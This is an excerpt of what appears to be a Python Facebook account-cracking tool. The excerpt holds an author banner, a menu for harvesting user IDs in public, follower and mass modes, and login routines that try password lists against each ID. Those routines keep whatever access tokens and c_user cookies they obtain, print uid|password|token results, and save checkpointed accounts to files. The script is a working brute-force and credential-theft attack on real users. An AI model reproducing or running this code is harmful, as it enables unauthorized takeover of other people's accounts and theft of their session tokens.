...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 MATEEN🔥].  ║
 
\x1b[0;33m║       #TOOL AUTHOR [MATEEN] [ZAIB]║
...
\x1b[0;33m║#YOUTUBE : METOO TRICKS😐.  ║
 
\x1b[0;33m║#FACEBOOK : NAME [Abdul Mateen  II ].       ║
 
\x1b[0;33m║#GITHUB : https://github.com/Metoohacker.   ║
 
\x1b[0;33m║#WHATSAPP : 03000000000.                   ║
...
def menu():
	...
	elif Mateen == "1" or Mateen == "01":
 
		publik()
 
		method()
 
	elif Mateen == "2" or KHAN == "02":
 
		follower()
 
		method()
 
	elif Mateen == "3" or  Mateen == "03":
 
		massal()
 
		method()
 
	elif Mateen == "4" or Khan == "04":
	...
	elif Mateen == "5" or Mateen == "05":
 
		setting_ua()
 
	elif Mateen == "0" or Mateen == "00":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mMateen PRO/FASTER \033[1;97m]")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[METOO-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[MATEEN-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[MATEEN-CP] %s|%s\033[0;92m        "%(uid, pw))
 
				cp.append("%s|%s"%(uid, pw))
 
				open("CP/%s.txt"%(tMateen),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[MATEEN-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[MATEEN-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[MATEEN-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[MATEEN-CP] %s|%s\033[0;91m        "%(uid, pw))
